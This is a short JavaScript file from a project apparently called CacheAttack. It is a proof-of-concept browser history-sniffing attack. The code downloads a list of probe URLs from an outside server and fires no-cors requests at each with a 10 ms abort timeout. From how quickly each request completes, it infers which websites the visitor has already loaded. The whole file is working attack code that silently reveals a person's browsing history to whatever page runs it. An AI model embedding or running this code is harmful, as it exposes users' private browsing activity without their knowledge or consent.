// NDev 2019 https://github.com/NDevTK/CacheAttack
const max = 10;

async function getRules() {
let req = await fetch("https://cache.ndev.tk/rules")
let body = await req.json();
return new Map(body);
}

async function getWebsites() {
    Websites = await getRules();
    result = [];
    // Foreach website check if cached
    for (let website of Websites) {
        await ifCached(website[0]).then(_ => result.push(website[1])).catch(_ => {});
    }
    return result;
};

async function ifCached(url){
  var controller = new AbortController();
  var signal = controller.signal;
  let timeout = await setTimeout(_ => { // Stop request after max
    controller.abort();
    throw "Timeout";
  }, max);
  await fetch(url, {mode: "no-cors", signal});
  clearTimeout(timeout);
  return;
}
